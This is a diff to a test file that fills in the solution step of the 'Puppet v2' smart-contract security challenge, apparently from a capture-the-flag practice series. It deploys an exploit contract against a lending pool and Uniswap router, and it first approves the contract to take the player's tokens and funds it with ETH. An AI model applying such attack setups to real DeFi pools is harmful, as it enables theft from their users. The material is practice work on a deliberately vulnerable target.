@@ -83,6 +83,21 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        exploitFactory = await ethers.getContractFactory('PuppetV2Exploit', player);
+
+        //exploitAddress = "0x71c95911e9a5d330f4d621842ec243ee1343292e";
+        exploitAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: await player.getTransactionCount() + 1
+          });
+          
+        await token.connect(player).approve(exploitAddress, PLAYER_INITIAL_TOKEN_BALANCE);
+        attack = await exploitFactory.deploy(
+            lendingPool.address,
+            uniswapRouter.address,
+            token.address,
+            weth.address,
+            { value: PLAYER_INITIAL_ETH_BALANCE*99n/100n, gasLimit: 1e6 });
     });
 
     after(async function () {
